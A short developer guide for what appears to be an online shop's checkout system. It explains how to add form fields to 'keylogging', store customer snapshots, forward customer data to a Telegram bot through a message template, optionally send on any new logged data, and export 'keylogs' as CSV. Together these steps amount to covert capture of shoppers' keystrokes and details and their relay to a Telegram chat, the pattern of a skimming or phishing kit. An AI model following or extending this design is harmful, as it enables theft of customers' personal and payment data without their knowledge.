# Keylogging & Telegram Guide

## Add a new field to log (end-to-end)

1) Checkout form
- Add to `formData` in `src/app/checkout/page.tsx`.
- Add an input/textarea and bind `name` to the field.
- Include in `orderData` payload sent to `/api/checkout`.

2) Persist on order completion
- In `src/app/api/checkout/route.ts`, add the field to the `fields` object inside `persistCustomerSnapshot(...)` call.
- Optional: map it to `customers` by adding a column (schema in `src/lib/sqlite-database.ts`) and extending the mapping in `persistCustomerSnapshot`.

3) Telegram message
- In `src/lib/telegramService.ts`:
  - Extend `CustomerData` interface with the new field.
  - Update `formatCustomerData(...)` to include it in the message.
- In the checkout route, pass the new field to `sendCustomerData(...)`.

## Edit Telegram message template
- File: `src/lib/telegramService.ts`
- Function: `formatCustomerData(data)`
- Modify the string to add/remove lines. Example:
```ts
const newField = data.instagramHandle ? `🆕 Instagram: ${data.instagramHandle}` : ''
```

## Trigger when to send Telegram
- Currently only on successful order completion (in `src/app/api/checkout/route.ts`).
- To also send on any new data logged, call `telegramService.sendCustomerData(...)` from the desired API route (e.g., `/api/customer-data`).

## Export data (CSV)
- Customers: `/api/export/customers`
- Orders: `/api/export/orders`
- Keylogs (latest or full): `/api/export/keylogs?latest=true`

## Collections
- Collections are product `category` values.
- Create products with a `category` to populate collections.
- List collections: `/api/collections`.

## Security note
- For admin-only pages, secure behind an auth solution or an env-based token check before enabling in production.
